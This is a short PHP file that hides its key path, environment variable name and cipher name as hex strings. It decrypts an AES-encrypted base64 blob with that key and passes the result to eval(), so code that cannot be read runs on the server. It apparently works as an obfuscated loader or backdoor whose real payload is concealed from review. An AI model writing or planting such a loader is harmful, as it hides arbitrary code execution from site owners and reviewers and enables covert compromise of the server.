<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('u8Juy4+EpHKBkRCyTORt2A==');

$c=base64_decode(

'kcd03z/a92Nu5FI2lNr8O0YPChGOA2FWUT0QReN6Xf2AWt6xp4kLXETzhcvd9k1hOX1GPXp2FBnJ' .
'5TFP2P6le1VQ9IxkmvZRPIWTU++RhHmHlY+PhsuQO8bLqR+TwZx2XEz0oiuBCD31kAO9+jcZyWB4' .
'yk/LmxqWcxYKsUITCjhcKkW4edrUeuSdKUVjNybvTvLTOsAwWvC3jT8E3sv0wtCW5xx/m+aOmNXe' .
'1M5f0z5gW1doz8jr3TGvs6EgSYvScc1WVs4UmyQwmTbXDfDONfiLmoQ27xfuVvRC9GED4qzcUQ74' .
'xEk4vyk7s53aOYdfQiOgOTspE0zxTPSlgoLoMnFna6LPkdLG4wIgmqoV3gudemRrx4TpltwjqOcp' .
'g1tuXrvJUgVWGrrOl0vMEBIUDPz0k+KXr2hQ85tYkqmkFIfb55NWT/s0LCGe/fkKnHNzMeXVthMy' .
'usZI0k5vVXxpadBDPaiiUxSwtOBiIJPXWH063ym+sQQ/+MEcpZ9QNE56y5YFlUOrN6Igr7w6B/pM' .
'z6zUecdDajVOsynTBUJm8JX5qrIy0xQZZ0yNOY9OaPuw29M1JFNW4KBW4CW4P9EvKpq7vXPycnWk' .
'V+wUmtAQNiqxkDJXwd5DR/X1FphvP4R+wS5EFJgKocibnzxsQauXEAuIYrrUe5Loz5jv3+IP8/fX' .
'HUORD1YYZvBTa7Rx5tOxItH8Lgss65CDHZm8INxjXQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

